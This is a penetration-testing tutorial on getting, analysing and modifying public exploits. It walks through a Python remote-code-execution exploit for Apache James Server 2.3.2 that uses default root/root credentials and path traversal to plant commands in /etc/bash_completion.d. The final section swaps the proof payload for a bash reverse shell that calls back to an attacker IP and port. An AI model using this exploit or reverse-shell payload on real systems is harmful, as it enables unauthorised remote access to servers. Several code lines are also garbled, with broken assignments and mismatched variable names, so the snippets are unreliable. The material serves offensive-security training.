
-- How to work with Exploits and find them --

• Downloading Exploits
• Targets for Analysing and Modifying Exploit Code
• Verify Exploit Code
• Understanding how the Exploit Works
• Exploit Modifications


Use the Exploit-db and Searchsploit to verify that there are exploits are for the vulnerabilities that we had previously discovered. Now we will look at what you need to do to download, modify and execute those exploits. In particular there are a couple of steps required to ensure an exploit is executed safely and to prevent it from doing anything unexpected.
Many of the exploits available on Exploit-db are written in Python, Perl, Ruby or Bash and can be downloaded directly to the attack box. Once the scripts have been downloaded, we need to analyse the exploit code carefully to confirm that it exactly does what it advertises. Failure to take proper precautions could open backdoors on the attack machine, wipe an entire hard drive on the target machine or even add the machine to a botnet.
Once we’re sure that we’re dealing with an authentic exploit we will often need to make some modifications to adapt the exploit to our target. Many exploits are written as proofs of concept (POCs) which means that the exploit only proves that the attack can be done without causing harm (i.e. a harmless payload is used). By way of example, a proof-of-concept exploit that exploits a remote code execution vulnerability might be designed to just execute the ifconfig command and to display the output on a webpage thereby ‘proving the concept’ that remote code execution is possible without causing harm. However, such a result is pretty useless if you actually want to gain a shell on the host and therefore, we need to modify the payload. Modifying such an exploit for practical use will require replacing the ifconfig command with a reverse or bind shell command. Other modifications can include simply adding a target host, port or other variables, replacing the bind/reverse shellcode or modifying offsets in buffer overflow exploits.
Another reason to carefully examine the exploit code is that it often contains usage instructions in comment blocks, or they may be obvious from the code itself. To work properly most scripts, require a few (static) variables in the code or values that are passed as arguments (a value passed to a function or script, such as the IP address or a port) to be inserted. Usually, they will be specific to the target such as an IP address, a port and sometimes credentials to access an administration panel for example. By analysing the code of the exploit, we can find out which arguments are needed and how they are processed in the script. Many exploits are programmed to print out usage instructions to the terminal when invalid arguments are passed (or no arguments at all), but remember that we’re not executing anything at this moment and we want to retrieve information from static analysis. We are merely investigating how to use the script before its execution.

Note: Also use your common sense when analysing exploit code. If you’re dealing with a remote exploit that doesn’t take a target host as argument you’re probably dealing with a fake and potentially dangerous exploit.

So far we’ve talked about exploits written in scripting languages, such as Python and Perl. These scripting languages are interpreted scripting languages where the code is executed by an interpreter. An interpreter is a program that directly executes instructions written in a scripting language. For example, Python code needs to be executed by a Python interpreter and to execute Perl code you would need to use a Perl interpreter. There are also exploits written in programming languages that need to be compiled before they can be executed. Compilation is the process of translating one programming language into another where the output is an executable program. Privilege escalation exploits for Linux and Windows are often written in such languages.


-- Downloading Exploits --

Before we can start to modify an exploit we first need to download it to the attack machine. The easiest methods for obtaining exploits is by:

• Downloading them from Exploit-db via a browser;
• Using a command line tool like wget; or,
• Copying the exploit code from Searchsploit

On the Exploit-DB website simply press the download button to download the selected exploit to your machine.

You can also use wget to download the exploit from the command line: wget https://www.exploit-db.com/download/35513 -O 35513.py
You can also copy the exploit from the local Searchsploit database to a different location, such as the desktop: searchsploit 35513
We can also add the -p option to show the full path of the exploit script: searchsploit 35513 -p
Now that we know the location of the exploit, we can copy it to the current working directory with the following command: cp /usr/share/exploitdb/exploits/linux/remote/35513.py ./

When using the local searchsploit exploit files it is recommended to always save a separate copy of the exploit file to another location so that you are not modifying the original file as you may need to revert to or reuse the original file later.


-- Targets for Analysing and Modifying Exploit Code --

When analysing exploit code, we are trying to:

• Verify that the exploit works exactly as advertised;
• Get a general understanding of how the vulnerability is exploited;
• See if there are any instructions from the exploit author on how to use the exploit or the parts of the code we need to modify;
• Modify the code depending on our target, mainly by inserting variables such as the IP address, port, payload or other target specific details;


-- Verify Exploit Code --

#!/usr/bin/python
#
#Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution 
#Date: 16\10\2014
#Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
#Vendor Homepage: http://james.apache.org/server/
#Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip 
#Version: Apache James Server 2.3.2
#Tested on: Ubuntu, Debian
#Info: This exploit works on default installation of Apache James Server 2.3.2
#Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d, /etc/pm/config.d

import socket
import sys
import time

#specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload '[ "$(id -u)"' == "0" ] && touch /root/proof.txt' # to exploit only on root 
#credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd= 'root'


Shebang
The Shebang is character sequence (#!) and an absolute path to the interpreter program. The shebang is located at the beginning of a script and tells the system to run the interpreter program with the script contents as the first argument. This will basically execute the script with the pre-defined interpreter.

Python shebang: #!/usr/bin/python
Bash shebang: #!/bin/bash
Bourne shell shebang: #!/bin/sh
Perl shebang: #!/usr/bin/perl


The exploit title in the Searchsploit Database (Apache James Server 2.3.2 Remote Code Execution) tells us that we’re dealing with a remote code execution (RCE) exploit targeting the Apache James Server 2.3.2. This means that a vulnerability in the Apache James Server is exploited by the Python script (35513.py) to execute code in the context of the user that is running Apache James. Any Remote Code Execution exploit should contain at least a targeted host IP, a port and a payload containing one or more commands to execute. 
The first dozen or so lines contain the Python shebang and comments or notes from the author giving the exploit title, date, author and information about vulnerable targets. The last three lines import the required modules to run the script.
The payload in the context of an exploit is the piece of code that performs the malicious action, in this exploit it’s the ‘payload’ variable that contains the command that is executed on the exploited system. The first part of the command ([ “$(id-u)” == “0” ]) tests if the outcome of the ‘id -u’ command equals 0. To see what id -u outputs on the command line, we can simply enter it into the terminal:

If we check the id help (id –help) from the terminal it tells us that id -u prints the effective user ID. User ID 0 is the user ID of the root account which means that the payload is executed when Apache James runs as root on the target host. The touch command (touch /root/root.txt) simply creates a file with the title proof.txt in the root directory and will be executed when Apache James runs with root privileges.
The last 2 lines are the default credentials used to log into the Apache James administration panel. This indicates that we’re dealing with an authenticated remote code execution exploit. This exploit also requires a user to be logged in to exploit the vulnerability.
Another important part of the code to consider here are the commented lines that provide a great deal of information about the code and how to move forward. The comments are printed in red on the screenshot and start with a # sign. The first comment tells us to specify a payload and also includes an example of a payload that is executed under any user. The second comment indicates that the current payload is only executed when Apache James is running as root. Finally, the last comment indicates that the ‘user’ and ‘pwd’ variables are the credentials for the James Remote Administration Tool and even includes the default credentials


-- Understanding how the exploit works --

We will continue with the lines of code that are executed after both the payload and default user credentials have been loaded:

if len(sys.argv) != 2:
  sys.stderr.write("[-]Usage: python %s \n" % sys.argv[0]) 
  sys.stderr.write("[-] Exemple: python %s 127.0.0.1\n" % sys.argv[0]) 
  sys.exit(1)
ip = sys.argv[1]

The first line (if len(sys.argv) !=2:) checks the number of arguments given when the script is executed. The exploit expects a total of 2 arguments: argument 0 which is the script itself and argument 1 which is the target IP address. If the number of arguments does not equal 2, then the exploit will print the instructions for use to the terminal and exit (remember we said above that if the arguments are not given properly, this will often be the result).

try:
  print "[+] Connecting to James Remote Administration Tool..." 
  S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, 4555))
  s.recv(1024)
  s.send(user + "\n")
  s.recv(1024)
  s.send(pwd+ "\n")
  s.recv(1024)
  print "[+] Creating user..."
  s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
  s.recv(1024) 
  s.send("quit\n") 
  s.close()

The first line prints a line of text to the terminal indicating that the exploit is connecting to the James Remote Administration Tool. The following line creates an INet streaming socket that will be used to connect to the IP address. Simply put this line connects to a remote socket using the given IP address and port, in this case the Apache James Remote Administration tool. Next, we see that target port 4555 is hardcoded in the exploit code.
The next few lines communicate with the Apache James server and issue a few commands programmatically. The first couple of lines establish an authenticated connection with the Apache James server using the variables that contain the username and the password. Line 6 (s.send(user + “\n”)) sends the username stored in the user variable (earlier defined as ‘root’) and line 8 (s.send(pwd + “\n”) sends the contents of the pwd (password) variable (also set as ‘root’). The lines that follow print the message “Creating User” to the terminal and issue the ‘adduser’ command which creates a new account on the Apache James server. Finally, the script closes the connection with the Apache James server by running the ‘quit’ command.
From this code we can assume that the ‘adduser’ command adds a user to the Apache James server and takes a username and password as arguments. We can also assume that the argument passed to the ‘adduser’ function is probably not sufficiently validated and therefore vulnerable to a directory traversal vulnerability (indicated by the parent directory symbols commonly used in this type of vulnerability). Let’s continue examining the exploit code to find out if our assumptions are correct!

Note: It is important to consider that this code block simply connects to the remote command line interface and does nothing more than issuing a few commands. We could also use a Telnet client to connect to the server manually and issue the commands manually.
Note: The ‘/etc/bash_completion.d’ directory which was used as the username is a directory on Linux systems that contains commands that are executed when a user signs in.

print "[+] Connecting to James SMTP server..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,25))
s.send("ehlo team@team.pl\r\n")
recv(s)
print "[+]Sending payload..."
s.send("mail from: \r\n")
recv(s)
#also try s.send("rcpt to: \r\n") if the recipient cannot be found 
s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n”)
recv(s)
s.send("data\r\n")
recv(s)
s.send("From: team@team.pl\r\n")
s.send("\r\n")
s.send("\n")
s.send(payload + "\n")
s.send("\r\n.\r\n")
recv(s)
s.send("quit\r\n")
recv(s) 
s.close()
print "[+]Done! Payload will be executed once somebody logs in."

The second code block connects to the Apache James SMTP server on port 25 on the IP address specified by sending the query ehlo ( “ehlo  team@team.pl\r\n” ). The commands that follow appear to construct an e-mail message containing the following fields:

• Mail from (< “mail from‘@team.pl>\r\n”)
• Rcpt to (“rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n”)
• Data containing the payload (“data\r\n”) to (payload + “\n”)
• The ‘.’ (or dot) command to send the e-mail (“\r\n.\r\n”)
• The quit command to exit (“quit\r\n”)

These are all valid commands to communicate with a Simple Mail Transfer Protocol (SMTP) server and we can assume that the code here is constructing an e-mail message, specifies the user that was created earlier as recipient, creates a message and finally sends it to the recipient. We can also see that the message itself contains the contents of the payload variable. Also note the comment in red in the screenshot that indicates that a valid recipient account is required on the target host and suggests appending the hostname if the recipient cannot be found. The last line prints to the terminal that the payload will be executed when someone signs in.
To sum it all up: The ‘/etc/bash_completion.d’ directory is used as the user directory to store messages. When a message contains commands, they are executed when a user signs in. So the exploit creates a user to allow a payload to be loaded into this directory knowing that the payload will be executed as soon as a user signs in.
There’s a good chance that errors will occur during the execution of this exploit. For troubleshooting purposes, you can also perform the script steps manually. To do so, just connect to the target host on port 4555 and 25 using Telnet or Netcat and issue the commands from the exploit code. An advantage in performing this manually is that you can directly verify if the commands have been successfully executed or have resulted in an error. For example, if you specify an invalid sender when a valid sender is needed, the SMTP server will throw an error, but such errors are not visible when the Python script is executed. This is why manual troubleshooting is advisable when an exploit fails.


-- Exploit Modifications --

In this section we will modify the parts of the exploit to get a shell on the target, remember to copy the original exploit before editing it so you can revert back to the copy when necessary. The only piece of code that we have to modify is the payload section. The current payload just creates a file in the root directory when the user executing the command is authenticated as root. However, we want to be able to execute commands on the target host so let’s replace the payload with some code that will create or ‘spawn’ a reverse bash shell:

bash -i >& /dev/tcp/[attacker IP]/[port] 0>&1

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload= 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' # to exploit only on root 
# credentials to James Remote Administration Tool (Default - root/root) 
user 'root'
pwd = 'root'













































